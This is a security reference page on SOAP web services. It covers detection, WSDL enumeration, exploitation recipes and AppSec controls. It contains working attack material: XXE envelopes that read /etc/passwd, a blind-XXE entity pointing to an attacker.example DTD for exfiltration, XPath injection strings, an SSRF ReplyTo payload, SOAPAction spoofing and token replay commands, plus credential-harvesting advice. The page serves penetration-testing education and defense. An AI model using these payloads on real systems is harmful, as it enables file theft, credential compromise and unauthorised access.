# SOAP

> SOAP (Simple Object Access Protocol) is an XML-based messaging protocol for exchanging structured information between distributed systems. It predates REST, was the dominant enterprise integration format through the 2000s, and remains in production in banking, insurance, government, healthcare, and telecom. Most SOAP services are described by a WSDL (Web Services Description Language) file, which lists every operation, message, and binding.
>
> SOAP is not inherently insecure, but its surface is larger than REST: XML parsers with entity expansion (XXE, billion laughs), WS-Security token handling, WS-Addressing header processing, and WSDL exposure. In many enterprise deployments SOAP endpoints bypass modern WAFs because the WAF does not understand SOAP-specific attack patterns (SOAPAction spoofing, WS-Security replay, XPath injection in addressing headers).
>
> This file covers SOAP from both sides: the pentest track (detection, enumeration, exploitation) and the AppSec track (root causes, controls, verification).
>
> Production context tags: [LAB] HTB/OSCP labs only, [PROD] safe for production, [PROD-RISK] use with care, [PROD-NO] do not run against production.

## Table of Contents

1. [What SOAP Is](#1-what-soap-is)
2. [Detection](#2-detection)
3. [Enumeration](#3-enumeration)
4. [Attack Surface Map](#4-attack-surface-map)
5. [Common Variants](#5-common-variants)
6. [Exploitation Recipes](#6-exploitation-recipes)
7. [Post-Exploitation](#7-post-exploitation)
8. [Risk Context (AppSec)](#8-risk-context-appsec)
9. [Root Causes (AppSec)](#9-root-causes-appsec)
10. [Preventive Controls (AppSec)](#10-preventive-controls-appsec)
11. [Detection Controls (AppSec)](#11-detection-controls-appsec)
12. [Verification (AppSec)](#12-verification-appsec)
13. [OSCP Notes](#13-oscp-notes)
14. [Production Notes](#14-production-notes)
15. [References](#15-references)

---

## 1. What SOAP Is

SOAP is a message format, not a transport. Messages are XML envelopes and can be sent over HTTP (most common), SMTP, TCP, or JMS. The HTTP binding is what pentesters see most often.

### 1.1 Message structure

```xml
<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
      <wsse:UsernameToken>
        <wsse:Username>alice</wsse:Username>
        <wsse:Password Type="PasswordText">s3cret</wsse:Password>
      </wsse:UsernameToken>
    </wsse:Security>
  </soap:Header>
  <soap:Body>
    <m:GetUser xmlns:m="http://example.com/user">
      <m:UserId>42</m:UserId>
    </m:GetUser>
  </soap:Body>
</soap:Envelope>
```

Three parts:

- **Envelope** - the root element, mandatory.
- **Header** - optional; carries WS-Security tokens, WS-Addressing, session info.
- **Body** - the actual operation invocation (method name and parameters).

### 1.2 SOAP 1.1 vs SOAP 1.2

| Aspect | SOAP 1.1 | SOAP 1.2 |
|--------|----------|----------|
| Envelope namespace | `http://schemas.xmlsoap.org/soap/envelope/` | `http://www.w3.org/2003/05/soap-envelope` |
| HTTP `Content-Type` | `text/xml` | `application/soap+xml` |
| Operation selector | `SOAPAction` HTTP header | `action` parameter inside Content-Type |
| Binding namespace | `http://schemas.xmlsoap.org/soap/http` | `http://www.w3.org/2003/05/soap/bindings/HTTP/` |

Both are XML, but the frameworks differ. A scanner that only understands SOAP 1.1 will miss SOAP 1.2 endpoints.

### 1.3 WSDL

The WSDL is an XML document describing:

- **Types** - XML Schema (XSD) definitions of the messages.
- **Messages** - request and response message names.
- **Port types** - operations the service offers.
- **Bindings** - protocol and message format for each port type.
- **Services** - the network endpoint (URL).

A WSDL is public API documentation. If exposed, it gives every operation name and parameter. Common URLs:

```text
/ws/ServiceName?wsdl
/ServiceName.asmx?WSDL
/ServiceName.svc?wsdl
/Service?wsdl=1
/ServiceName?WSDL
/axis2/services/ServiceName?wsdl
```

### 1.4 WS-Security (WSS)

WS-Security is the SOAP extension for message-level security. Common tokens:

- **UsernameToken** - plaintext or digest username/password.
- **X.509 Certificate Token** - message signed with a certificate.
- **SAML Assertion** - federated identity token.
- **Kerberos Token** - Windows-integrated.
- **Timestamp** - replay protection, often missing or unbounded.

Message-level security is orthogonal to transport security. A SOAP service can be HTTPS-only and still accept unsigned, unauthenticated messages.

---

## 2. Detection

SOAP endpoints are detected when:

- An HTTP response contains XML with `<soap:Envelope>` or `<SOAP-ENV:Envelope>`.
- A `?wsdl` query parameter returns an XML schema.
- `Content-Type` is `text/xml` (SOAP 1.1) or `application/soap+xml` (SOAP 1.2).
- The `SOAPAction` header is present (SOAP 1.1).
- Common paths `/ws/`, `/services/`, `/soap/`, `*.asmx`, `*.svc` return XML.

### Quick detection

```bash
# Probe for WSDL
for path in "/?wsdl" "/ws?wsdl" "/services?wsdl" "/Service.asmx?WSDL" "/Service.svc?wsdl"; do
  code=$(curl -s -o /tmp/wsdl -w "%{http_code}" "http://$TARGET$path")
  if [ "$code" = "200" ] && grep -q "<definitions" /tmp/wsdl; then
    echo "[+] WSDL: $path"
  fi
done

# Probe a SOAP 1.1 endpoint with an empty envelope
curl -s -X POST "http://$TARGET/ws/UserService" \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: \"\"" \
  --data '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body/></soap:Envelope>'
```

Expected output (SOAP 1.1 fault):

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <soap:Fault>
      <faultcode>soap:Client</faultcode>
      <faultstring>SOAPAction header missing or invalid</faultstring>
    </soap:Fault>
  </soap:Body>
</soap:Envelope>
```

### Quick reference table

| Signal | Meaning | Next step |
|--------|---------|-----------|
| `?wsdl` returns XML with `<definitions>` | WSDL exposed | Parse operations with `wsdl` tools |
| `text/xml` + `SOAPAction` | SOAP 1.1 | Send SOAP 1.1 envelopes |
| `application/soap+xml` | SOAP 1.2 | Send SOAP 1.2 envelopes |
| `.asmx` / `.svc` URL | ASP.NET web service | Try `?WSDL`, `?disco` |
| `<wsse:UsernameToken>` in error echo | WS-Security in use | Try replay, digest bypass |
| SOAP fault with stack trace | Verbose errors | Look for file paths, framework versions |
| HTTP 500 with XML body | SOAP fault | Parse faultstring for hints |

---

## 3. Enumeration

### 3.1 WSDL parsing

If the WSDL is exposed, extract every operation and parameter:

```bash
# With SoapUI (GUI) - import the WSDL URL
# With wsdl2py / suds (Python)
pip install zeep
python3 - <<'PY'
from zeep import Client
client = Client("http://target.htb/ws/UserService?wsdl")
for service in client.wsdl.services.values():
    for port in service.ports.values():
        for op_name, op in port.binding._operations.items():
            print(op_name, "->", op.input.body)
PY
```

Expected output:

```text
GetUser -> {http://example.com/user}GetUserRequest
ListUsers -> {http://example.com/user}ListUsersRequest
DeleteUser -> {http://example.com/user}DeleteUserRequest
```

### 3.2 Common endpoint paths

```text
/ws/
/services/
/soap/
/api/soap
/cxf/
/axis2/services/
/ServiceName.asmx
/ServiceName.svc
/ServiceName?wsdl
/ServiceName?WSDL
/ServiceName?disco
/ServiceName?wsdl=1
```

### 3.3 Framework fingerprinting

The SOAP fault structure reveals the framework:

| Signal | Framework |
|--------|-----------|
| `<faultcode>soap:Server</faultcode>` with Axis version in message | Apache Axis / Axis2 |
| `cxf.apache.org` in fault namespace | Apache CXF |
| `http://schemas.microsoft.com/...` | .NET WCF / ASMX |
| `<soap:Fault><faultcode>Client</faultcode>` with no namespace | Generic (JAX-WS) |
| Stack trace with `com.sun.xml.ws` | JAX-WS RI (Metro) |
| Stack trace with `org.springframework.ws` | Spring WS |

Each framework has its own known XXE behavior, SOAPAction handling, and error surface.

### 3.4 SOAPAction enumeration

SOAP 1.1 uses the `SOAPAction` header to dispatch operations. If the dispatcher routes by SOAPAction without checking it against the WSDL, an attacker can call operations not listed:

```bash
for action in "GetUser" "ListUsers" "DeleteUser" "GetAdminConfig" "ReloadConfig"; do
  curl -s -X POST "http://$TARGET/ws/UserService" \
    -H "Content-Type: text/xml" \
    -H "SOAPAction: \"http://example.com/user/$action\"" \
    --data "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><m:$action xmlns:m=\"http://example.com/user\"/></soap:Body></soap:Envelope>" \
    | head -5
  echo "---"
done
```

Different fault messages for "operation not found" vs "invalid parameters" reveal which operations exist.

### 3.5 Auth enumeration

```bash
# Without any auth
curl -s -X POST "http://$TARGET/ws/UserService" -H "Content-Type: text/xml" --data @get-user.xml

# With a random UsernameToken
# Edit the envelope, replace <wsse:Username> and <wsse:Password>

# With a peer's UsernameToken
# Same, using a token captured from another session
```

---

## 4. Attack Surface Map

| Layer | Vector | What to test |
|-------|--------|--------------|
| XML parser | XXE | `<!DOCTYPE>` with `<!ENTITY>` in body, header, or any CDATA |
| XML parser | Billion laughs | Nested entity expansion |
| XML parser | XInclude | `<xi:include href="file:///etc/passwd"/>` |
| XML parser | XSLT | `<xsl:stylesheet>` in body if XSLT enabled |
| Dispatch | SOAPAction spoofing | Call operations not in WSDL |
| Dispatch | Method override | SOAPAction vs body operation mismatch |
| WS-Security | UsernameToken replay | Resend a captured token |
| WS-Security | Password digest bypass | Weak nonce/counter handling |
| WS-Security | Timestamp manipulation | No expiry or no validation |
| WS-Addressing | XPath injection | `To`, `ReplyTo`, `FaultTo` elements |
| WS-Addressing | SSRF | `ReplyTo` pointing to attacker's host |
| WSDL | Enumeration | Full API surface exposed |
| WSDL | DoS | Recursive imports, huge schemas |
| Transport | HTTP only | MITM token theft |
| Transport | TLS downgrade | Weak cipher negotiation |

---

## 5. Common Variants

### 5.1 XXE in SOAP body

Any XML parser that resolves external entities is vulnerable. SOAP is XML, so SOAP body, SOAP header, and WSDL itself are all XXE surfaces.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <m:GetUser xmlns:m="http://example.com/user">
      <m:UserId>&xxe;</m:UserId>
    </m:GetUser>
  </soap:Body>
</soap:Envelope>
```

If the response echoes the content, XXE is confirmed. For blind XXE, use out-of-band: `<!ENTITY % dtd SYSTEM "http://attacker.example/evil.dtd">` and exfiltrate via HTTP/DNS.

**CWE-611:** Improper Restriction of XML External Entity Reference. **OWASP 2021:** A05 Security Misconfiguration. See `../../01 Web/08 Vulnerabilities/XXE.md`.

### 5.2 SOAPAction spoofing

SOAP 1.1 lets the dispatcher route by `SOAPAction` header or by body operation name. If it routes by header only, and does not validate the body, an attacker can call any operation by specifying the right SOAPAction. If the WAF only inspects the body, the SOAPAction slip bypasses it.

**CWE-436:** Interpretation Conflict. **OWASP 2021:** A01, A05.

### 5.3 XPath injection in WS-Addressing

WS-Addressing elements (`<wsa:To>`, `<wsa:ReplyTo>`, `<wsa:MessageID>`) are often inserted into an XPath query or an internal routing table. If concatenated without escaping, they are an XPath injection surface.

```xml
<wsa:To>http://example.com/user/' or '1'='1</wsa:To>
```

**CWE-643:** Improper Neutralization of Data within XPath Expressions. **OWASP 2021:** A03 Injection.

### 5.4 WS-Security UsernameToken replay

A captured `UsernameToken` (with `PasswordDigest` and `Nonce`) can be replayed if the server does not enforce:

- `Timestamp` expiry (usually 5 minutes).
- `Nonce` cache (reject reused nonces).
- Message ID uniqueness.

Without these, a MITM capture is enough to impersonate the client.

**CWE-294:** Authentication Bypass by Capture-replay. **OWASP 2021:** A07 Identification and Authentication Failures.

### 5.5 WS-Security digest bypass

Some implementations compute the digest incorrectly, or accept `PasswordText` when `PasswordDigest` was expected. Test both:

- Send `PasswordText` where `PasswordDigest` is expected.
- Send an empty `<wsse:Password>`.
- Send a `<wsse:UsernameToken>` with no `<wsse:Password>`.

**CWE-287:** Improper Authentication. **OWASP 2021:** A07.

### 5.6 SOAP header injection

SOAP headers are less scrutinized than bodies. WAFs often inspect only `<soap:Body>`. An XXE or injection payload in `<soap:Header>` may pass.

```xml
<soap:Header>
  <evil xmlns=""><![CDATA[<script>...]]></evil>
</soap:Header>
```

**CWE-91:** XML Injection. **OWASP 2021:** A03.

### 5.7 WSDL disclosure

The WSDL itself is a map of the API. Exposed `?wsdl` endpoints give every operation, parameter, and type. Combined with missing auth, this is a complete compromise path.

**CWE-200:** Exposure of Sensitive Information. **OWASP 2021:** A05.

### 5.8 Blind SSRF via WS-Addressing ReplyTo

The `ReplyTo` and `FaultTo` elements tell the server where to send responses. If the server actually makes an outbound HTTP request to that address, it is SSRF.

```xml
<wsa:ReplyTo>
  <wsa:Address>http://attacker.example:8080/</wsa:Address>
</wsa:ReplyTo>
```

Watch the attacker listener for a callback.

**CWE-918:** Server-Side Request Forgery. **OWASP 2021:** A10 SSRF.

### 5.9 Known SOAP-related CVEs

- **CVE-2019-9670** (Zimbra Collaboration Suite): XXE in the `AuthRequest` SOAP endpoint. Full read of local files, leading to credential theft and RCE.
- **CVE-2021-44228** (Log4Shell): exploitable on SOAP endpoints that log message content via Log4j.
- **CVE-2017-9805** (Apache Struts REST plugin): not SOAP per se, but the XML deserialization class applies to any XML-over-HTTP endpoint with Java XStream.

Check the target framework version against NVD for SOAP-parser-specific CVEs.

---

## 6. Exploitation Recipes

### 6.1 XXE in SOAP body to file read

1. Confirm the service accepts XML bodies.

```bash
curl -s -X POST "http://$TARGET/ws/UserService" \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: \"GetUser\"" \
  --data @get-user.xml
```

2. Inject a DOCTYPE with an external entity in `get-user.xml`:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <m:GetUser xmlns:m="http://example.com/user">
      <m:UserId>&xxe;</m:UserId>
    </m:GetUser>
  </soap:Body>
</soap:Envelope>
```

3. If the response contains the file content, XXE is confirmed. For Windows targets, use `file:///c:/windows/win.ini`.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### 6.2 SOAPAction spoofing to admin method

1. Parse the WSDL for operation names.

```bash
curl -s "http://$TARGET/ws/UserService?wsdl" | grep -oE 'operation name="[^"]+"'
```

2. Call an admin operation with the correct SOAPAction but without an authenticated session.

```bash
curl -s -X POST "http://$TARGET/ws/AdminService" \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: \"http://example.com/admin/ListAllUsers\"" \
  --data '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><m:ListAllUsers xmlns:m="http://example.com/admin"/></soap:Body></soap:Envelope>'
```

3. If the response contains data, the dispatcher routes by SOAPAction without auth check.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### 6.3 WS-Security UsernameToken replay

1. Capture a valid login envelope (from traffic, logs, or a legitimate client).
2. Extract the `<wsse:UsernameToken>` block.
3. Replay it in a new envelope:

```bash
curl -s -X POST "http://$TARGET/ws/UserService" \
  -H "Content-Type: text/xml" \
  --data @captured-envelope.xml
```

4. If the server accepts the token past its Timestamp expiry, replay protection is missing.

### 6.4 Blind SSRF via WS-Addressing ReplyTo

1. Start a listener on your host:

```bash
python3 -m http.server 8080
```

2. Send a request with `ReplyTo` pointing to your listener.

```xml
<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:wsa="http://www.w3.org/2005/08/addressing">
  <soap:Header>
    <wsa:ReplyTo>
      <wsa:Address>http://10.10.14.5:8080/</wsa:Address>
    </wsa:ReplyTo>
    <wsa:MessageID>uuid:1234</wsa:MessageID>
    <wsa:To>http://target.htb/ws/UserService</wsa:To>
    <wsa:Action>GetUser</wsa:Action>
  </soap:Header>
  <soap:Body>
    <m:GetUser xmlns:m="http://example.com/user"><m:UserId>1</m:UserId></m:GetUser>
  </soap:Body>
</soap:Envelope>
```

3. Watch the listener. A callback with SOAP headers indicates SSRF.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### 6.5 WSDL-driven mass enumeration

1. Download the WSDL.
2. Parse every operation.
3. Call each operation with empty or default parameters.
4. Log which operations return data, and which leak errors with paths or versions.

```bash
pip install zeep
python3 - <<'PY'
from zeep import Client
client = Client("http://target.htb/ws/UserService?wsdl")
for service in client.wsdl.services.values():
    for port in service.ports.values():
        for op_name in port.binding._operations:
            try:
                result = getattr(client.service, op_name)()
                print(f"[+] {op_name}: {result}")
            except Exception as e:
                print(f"[-] {op_name}: {e}")
PY
```

---

## 7. Post-Exploitation

Once SOAP is compromised:

- **Credential harvesting.** XXE reads local config files (DB connection strings, API keys). WS-Security tokens can be extracted from logs or memory.
- **API enumeration.** The WSDL gives every operation. Look for admin operations, internal methods, and debug endpoints.
- **Lateral movement.** SOAP services often have database connections, message queue access, or file system access. XXE-to-SSRF-to-internal-network is a common chain.
- **Reconnaissance for adjacent services.** A SOAP service in a microservice architecture can reveal internal endpoints, LDAP/AD paths, or service mesh names in fault messages.

For the report: which operations were reachable, which accepted unauthenticated calls, what data was leaked.

---

## 8. Risk Context (AppSec)

SOAP vulnerabilities map to the OWASP Top 10:2021 and API Top 10:2023:

| Standard | SOAP-specific manifestation |
|----------|------------------------------|
| OWASP 2021 A01 Broken Access Control | Missing operation-level auth, SOAPAction bypass |
| OWASP 2021 A02 Cryptographic Failures | HTTP-only SOAP, weak TLS, PasswordText instead of digest |
| OWASP 2021 A03 Injection | XXE, XPath injection in addressing, XML injection in headers |
| OWASP 2021 A05 Security Misconfiguration | WSDL in production, verbose SOAP faults, DTD processing enabled |
| OWASP 2021 A07 Auth Failures | UsernameToken replay, digest bypass, no timestamp validation |
| OWASP 2021 A10 SSRF | WS-Addressing ReplyTo/FaultTo as SSRF vector |
| OWASP API 2023 API5 BFLA | Missing per-operation authorization |
| OWASP API 2023 API10 Unsafe Consumption | Trusting upstream SOAP headers without re-validation |

---

## 9. Root Causes (AppSec)

The recurring root causes for SOAP vulnerabilities:

1. **XML parser defaults are unsafe.** DTD processing, external entity resolution, and XInclude are enabled by default in many XML parsers (Java `DocumentBuilderFactory`, .NET `XmlDocument`, Python `lxml`). Fixing XXE requires explicit configuration.
2. **WAFs do not understand SOAP.** Generic WAFs inspect `<soap:Body>` text but miss SOAPAction spoofing, WS-Security token structure, and addressing header injections.
3. **WS-Security is optional and rarely enforced.** Servers accept requests without `<wsse:Security>` if the WSDL says it is optional. It often is.
4. **WSDL in production.** The full API schema is a developer convenience. In production it is a map for attackers.
5. **Replay protection missing.** Nonce cache, message ID dedup, and timestamp expiry are all necessary. Any one missing means replay.
6. **Dispatch trust.** SOAPAction-based dispatch assumes the header matches the body. If a framework trusts the header, WAF rules based on the body miss the actual operation.

---

## 10. Preventive Controls (AppSec)

**XML parser:**

- **Disable DTD processing** (`disallow-doctype-decl` in Java, `XmlResolver = null` in .NET, `resolve_entities=False` in lxml).
- **Disable external entity resolution** (`external-general-entities` and `external-parameter-entities` off in Java).
- **Disable XInclude.**
- **Disable XSLT** if the service does not use it.
- **Set entity expansion limits** (defense against billion laughs).

**Application:**

- **Per-operation authorization.** Every SOAP operation checks the authenticated identity. Do not rely on the WSDL or the dispatcher.
- **Validate `SOAPAction` against `Body` operation.** Reject mismatches.
- **WSDL not exposed in production.** Move to internal documentation, or require auth on `?wsdl`.
- **Verbose faults disabled.** Return generic fault messages; log details server-side.
- **Rate limits per operation, per caller.**

**WS-Security:**

- **Enforce Timestamp** with a maximum skew (usually 5 minutes).
- **Reject replayed Message IDs** (cache of seen IDs).
- **Reject replayed Nonces** per UsernameToken.
- **Require signed body** where integrity matters.
- **Never accept `PasswordText` in transit** - use `PasswordDigest` with TLS, or signed SAML tokens.

**Transport:**

- **HTTPS-only.** Redirect or reject plain HTTP.
- **Strong TLS.** TLS 1.2+, modern ciphers, HSTS.
- **Client certificates for high-value services** if possible.

---

## 11. Detection Controls (AppSec)

Signals worth monitoring:

- **DTD in incoming requests.** Any `<!DOCTYPE` in a SOAP body or header is suspicious on a service that does not use DTDs.
- **External entity declarations.** `<!ENTITY` with `SYSTEM` or `PUBLIC` keywords.
- **SOAPAction / body mismatch.** Log both, alert on mismatch.
- **Repeated UsernameToken with same Nonce.** Replay signal.
- **Timestamp far from now.** Client clock skew, or a captured message being replayed.
- **ReplyTo / FaultTo pointing outside the application.** SSRF signal.
- **Excessive operation calls.** Enumeration or abuse.
- **WSDL requests in production.** If not expected, alert.

---

## 12. Verification (AppSec)

Concrete checks:

| Control | Verification |
|---------|--------------|
| DTD disabled | Send a body with `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`; expect a parser error, not file content |
| XInclude disabled | Send `<xi:include href="file:///etc/passwd"/>`; expect an error |
| WSDL auth | `curl http://target/ws?wsdl` without auth; expect 401/403 in production |
| Per-operation auth | Call every operation with a low-priv token; every non-public operation must return an authorization fault |
| SOAPAction match | Send a request with a SOAPAction that does not match the body; expect a fault |
| Timestamp enforcement | Send a message with a `Timestamp` 1 hour in the past; expect rejection |
| Nonce replay | Send the same UsernameToken twice; second call must be rejected |
| ReplyTo external | Send `ReplyTo` pointing to an external host; expect no callback |
| TLS enforced | `curl http://target/ws/`; expect redirect to HTTPS or rejection |

Cross-reference: OWASP ASVS 4.0 V1 (Architecture), V4 (Access Control), V5 (Validation), V9 (Communications), V13 (API and Web Service). OWASP API Security Top 10:2023 API1, API2, API5, API10. See `../../01 Web/09 OWASP Top 10/A01-Broken-Access-Control.md` and `../../01 Web/08 Vulnerabilities/XXE.md`.

---

## 13. OSCP Notes

SOAP rarely appears on OSCP, but when it does, the playbook is simple:

- **Find the WSDL.** Try `?wsdl`, `?WSDL`, `?disco` on any XML-looking endpoint.
- **Import into SoapUI** if you have it, or use `zeep` in Python. SoapUI auto-generates a request per operation.
- **Test XXE first.** Most SOAP endpoints use a default XML parser. Send `<!DOCTYPE>` + `<!ENTITY>`. This is the single highest-value test.
- **Test SOAPAction spoofing.** Modify the `SOAPAction` header to point at an admin operation; keep the body pointing at a user operation. Some dispatchers route by header.
- **Test WS-Security bypass.** Remove `<wsse:Security>` from the header. Some services still accept.
- **If nothing works, look at the fault.** SOAP faults sometimes leak stack traces, file paths, and framework versions.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## 14. Production Notes

| Practice | Verdict |
|----------|---------|
| HTTPS-only | Required |
| Strong TLS (1.2+) | Required |
| DTD processing disabled | Required |
| External entity resolution disabled | Required |
| XInclude disabled | Required |
| Per-operation authorization | Required |
| SOAPAction / body match validation | Required |
| WSDL not exposed in production | Required |
| Verbose faults disabled | Required |
| Timestamp enforcement in WS-Security | Required if WSS is used |
| Nonce replay protection | Required if UsernameToken is used |
| Rate limits per operation | Required |
| External entity in any header or body | Never |
| ReplyTo to external hosts | Never (unless explicitly designed) |

---

## 15. References

- W3C SOAP 1.1 specification - https://www.w3.org/TR/2000/NOTE-SOAP-20000508/
- W3C SOAP 1.2 specification - https://www.w3.org/TR/soap12/
- W3C WSDL 1.1 - https://www.w3.org/TR/wsdl
- OASIS WS-Security 1.1 - https://docs.oasis-open.org/wss/v1.1/
- OASIS WS-Addressing 1.0 - https://www.w3.org/TR/ws-addr-core/
- OWASP Web Security Testing Guide - Testing for XML Injection - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection
- OWASP Top 10:2021 - https://owasp.org/Top10/
- OWASP API Security Top 10:2023 - https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- OWASP ASVS 4.0 - https://owasp.org/www-project-application-security-verification-standard/
- CVE-2019-9670 (Zimbra XXE) - https://nvd.nist.gov/vuln/detail/CVE-2019-9670
- CVE-2021-44228 (Log4Shell) - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- CWE-611 Improper Restriction of XXE - https://cwe.mitre.org/data/definitions/611.html
- CWE-436 Interpretation Conflict - https://cwe.mitre.org/data/definitions/436.html
- CWE-643 XPath Injection - https://cwe.mitre.org/data/definitions/643.html
- CWE-294 Authentication Bypass by Capture-replay - https://cwe.mitre.org/data/definitions/294.html
- CWE-287 Improper Authentication - https://cwe.mitre.org/data/definitions/287.html
- CWE-91 XML Injection - https://cwe.mitre.org/data/definitions/91.html
- CWE-200 Exposure of Sensitive Information - https://cwe.mitre.org/data/definitions/200.html
- CWE-918 SSRF - https://cwe.mitre.org/data/definitions/918.html
